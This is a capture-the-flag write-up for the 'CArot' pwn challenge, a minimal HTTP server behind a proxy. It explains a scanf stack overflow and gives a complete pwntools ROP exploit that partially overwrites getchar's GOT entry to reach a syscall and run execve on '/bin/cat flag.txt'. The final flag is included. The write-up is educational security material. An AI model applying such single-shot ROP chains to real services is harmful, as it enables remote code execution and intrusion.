# CArot [pwn/320]

When dealing with proxy, it is often the case that you only have one "shot".

`nc 167.99.78.201 11451`

**Files**: `carot.tar.gz`:
```sh
$ tar ztf carot.tar*
distfiles/
distfiles/run_carot.sh
distfiles/run_proxy.sh
distfiles/xinetd_proxy_conf
distfiles/proxy.py
distfiles/libc-2.31.so
distfiles/carot.c
distfiles/carot
distfiles/xinetd_carot_conf
```
libc id is `libc6_2.31-0ubuntu9.2_amd64`

The remote service runs `proxy.py`, a python script that, roughly speaking, takes in <=4096 bytes from the user before throwing them all to `./carot`.

`carot` itself is a very, very simple HTTP binary server. Example usage:
```
$ ./carot <<EOF
> GET /index.html HTTP/1.1
>
> EOF
HTTP/1.0 200 OK
Content-Type: text/html

<html><head></head><body>It works!</body></html>
```
The main bug for `carot` is incredibly trivial and obvious by reading the source:
```c
#define BUFFERSIZE 512
char* http_receive_request() {
  ...
  char buffer[BUFFERSIZE] = {};
  scanf("%[^\n]", buffer);
  getchar();

  if (memcmp(buffer, "GET ", 4) != 0) return NULL;
  ...
}
int main() {
  setbuf(stdout, NULL);
  while (1) {
    char* fname = http_receive_request();
    ...
  }
}
```
The first line of input produces a buffer overflow very, very easily (512 < 4096), and also returns almost immediately so long as `GET ` isn't at the start of the input string.

The main challenge is in obtaining RCE using a single burst of input (the input _can_ contain multiple newlines, but it must all be sent before any bytes are received from stdout). This means no printing leaks & calculating libc addresses within pwntools.

## Solving
```python
from pwnscripts import *
context.libc = 'libc-2.31.so'
context.binary = 'carot'
r = remote('167.99.78.201', 11451)
```
There are about a hundred million ways to solve this challenge. Most of them center around the same general structure, though:
1. get a libc address to a known, writable location. Some people used the `stdout` pointer already available, but on my part, I copied an address from the GOT table to bss.
2. edit it to point to somewhere useful. This can mean pointing it to `system`, `execve`, a `one_gadget`, or (on my part) a `syscall` instruction.
3. put string arguments on .bss and call the libc address. Most people did something like `system("cat f*")`, but I ended up using `sys_execve` because I couldn't figure out a smart way to calculate the address of `system()/execve()/one_gadget` without bruteforcing (which you can do with `add` gadgets).

To get a libc address, I used a `mov rax, qword ptr [rbp-8]` and a `mov dword ptr [rbp-0xc], eax` gadget:

```python
POINTER = 0x602100 # where the libc address will be stored
R = ROP(context.binary)
R.raw(b'a'*0x210)
def move8(dst, src):  # must begin rop at pop rbp; ret
    DEREF_WRITE = 0x4008f1 # mov dword ptr [rbp - 0xc], eax; add rsp, 0x10; pop rbp; ret;
    DEREF_READ  = 0x400b7d # mov rax, qword ptr [rbp - 8]; add rsp, 0x10; pop rbp; ret;
    for offset in [0,4]:
        R.raw(src+8+offset) # rbp
        R.raw(DEREF_READ)
        R.raw(b'a'*0x10)    # padding
        R.raw(dst+12+offset)# rbp
        R.raw(DEREF_WRITE)
        R.raw(b'a'*0x10)    # padding
move8(POINTER, context.binary.got['getchar'])
```
Then, I used `scanf("%hhd")` to overwrite the last byte of `getchar()` to point to a syscall instruction:
```python
def scanf(*args): R.call(context.binary.sym.__isoc99_scanf, args)
FORMAT_LINE = 0x4012f0 # pointer to "[^\n]" in the binary
FORMAT_CHAR = POINTER+8 # pointer to "%hhd", which will be written later
COMMAND = FORMAT_CHAR+0x10 # pointer to a shell executable. I will use /bin/cat
ARGUMENT = COMMAND+0x10 # pointer to command's argument. Here it is "flag.txt".
SCRATCH = ARGUMENT+0x10 # space to dump miscellaneous data
ARGS = POINTER+0x100 # to store argv[]
R.raw(0) # rbp
scanf(FORMAT_LINE, FORMAT_CHAR) # Write "%hhd%*c" to bss
scanf(FORMAT_CHAR, POINTER) # overwrite getchar to point to syscall
```
This is accompanied with appropriate calls to r.sendline() later:
```python
payload = R.chain()
assert b'\n' not in payload
r.sendline(payload)   
r.sendline(b"%hhd%*c")  # first scanf call
r.sendline(b'\xc9')     # second scanf
```
After that, I fill writable memory with arguments to form `"/bin/cat flag.txt"`:
```python
scanf(FORMAT_LINE, COMMAND) # write /bin/cat somewhere
R.getchar()
R.call(R.ret)
scanf(FORMAT_LINE, ARGS)    # write argv somewhere
R.getchar()
R.call(R.ret)
scanf(FORMAT_LINE, ARGUMENT)# write argv[1] == "flag.txt"
R.getchar()
R.call(R.ret)

# ... (omitted code)

r.sendline(b'/bin/cat')
r.sendline(fit(COMMAND, ARGUMENT, 0))
r.sendline(b'flag.txt')
```
And finally, I make a call to execve:
```python
scanf(FORMAT_LINE, SCRATCH) # write a string where len(SCRATCH) == 59 == SYS_execve
R.strlen(SCRATCH)   # this will set rax to 0x3b.
R.ret2csu(edi=COMMAND, rsi=ARGS, rdx=0, call=POINTER)

# ...

r.sendline(b'a'*59)
r.sendline(b'')
print(r.recvline())
```

`ACSC{buriburi_1d3dfb9bf7654412}`
